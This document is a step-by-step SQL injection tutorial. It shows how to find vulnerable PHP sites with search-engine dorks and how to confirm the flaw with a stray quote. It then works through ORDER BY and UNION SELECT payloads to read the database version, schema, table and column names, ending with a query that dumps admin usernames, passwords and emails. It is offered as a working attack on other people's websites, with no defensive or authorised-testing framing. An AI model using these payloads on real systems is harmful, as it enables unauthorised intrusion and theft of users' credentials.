1)	Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks 

	a) Website Assessment
	In order for us to start exploiting a website we must first know exactly what we are injecting into. This is what we will be covering in Part One along with how to assess the information that we gather.
	Finding a vulnerable website
		You can use google hack for finding vulnerable sql server for example search for inurl:page.php?id=, chances of vulnerbility are high for these sites
	Testing a site for vulneribility
	Once you searched and identify a website for attack you can test it out if its vulnerable by using below code
		http://www.foo.bar/page.php?id=1
	In order to test this site all we need to do is add a ' either in between the "=" sign and the "1" or after the "1" so it looks like this:
	http://www.foo.bar/page.php?id=1'  or http://www.foo.bar/page.php?id='1
	If the website is vulnerable then you should get output with error something similar like below	
		Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /home1/foobar/public_html/gallery.php on line 5
	
	b) Determining the amount of columns
	If we want to use commands and get results we must know how many columns there are on a website, to find the number of columns we write a query with incrementing values until we get an error, like this:
		http://www.thesite.com/page.php?id=1 ORDER BY 1-- <---No error
		http://www.thesite.com/page.php?id=1 ORDER BY 2-- <---No error
		http://www.thesite.com/page.php?id=1 ORDER BY 3-- <---No error
		http://www.thesite.com/page.php?id=1 ORDER BY 4-- <---No error
		http://www.thesite.com/page.php?id=1 ORDER BY 5-- <---ERROR!
	This means that there are four columns!
	c) Finding which columns are vulnerable
	So we know that there are four columns now we have to find out which ones are vulnerable to injection. To do this we will use the UNION and SELECT queries while keeping the double null (--) at the end of the string.
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,2,3,4--
	Now after entering that query you should be able to see some numbers somewhere on the page that seem out of place. Those are the numbers of the columns that are vulnerable to injection.

2)	Gathering Information
	In this part we will discover how to find the name of the database and what version of SQL the website is using by using queries to exploit the site.

	In part one we saw how to find the vulnerable columns. Using that information we can put together our next query (I will be using column 2 as an example). The command should look like this:
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,@@version,3,4--
	Because 2 is the vulnerable column, this is where we will place "@@version". Another string that could replace "@@version" is "version()".
	If the website still does not display the version try using unhex(hex()) which looks like this:
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,unhex(hex(@@version)),3,4--
	You will probably see something like this, version of database
		5.1.44-community-log
	
	
3)	Finding the database
	To find the database we use a query like the one below:
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata--
	if this fails try another below
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,concat(database()),3,4--
	You will get the name of the db

4)	Finding usernames, emails and passwords!
	To find the table names we use a query that is similar to the one used for finding the database with a little bit extra added on:
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--
	It may look long and confusing but once you understand it, it really isn't so. What this query does is it "groups" (group_concat) the "table names" (table_name) together and gathers that information "from" (FROM) information_schema.tables where the "table schema" (table_schema) can be found in the "database" (database()).
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 30,1--
	Notice how my limit was 30,1 instead of 31,1? This is because when using limit is starts from 0,1 which means that the 30th is actually the 31st Tongue
	You now have all the table names!

5) 	Finding the column names
	Now that you have all of the table names try and pick out the one that you think would contain other information. Usually they're tables like User(s), Admin(s),
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name="Admin"--

6)	Displaying the column contents
	To view the columns we need to decide which ones we want to see and then use this query (in this example I want to view the columns "username", "password", and "email", and my database name will be "db123"). This is where the database name comes in handy:
		http://www.thesite.com/page.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password,0x3a,email),3,4 FROM db123.Admin--
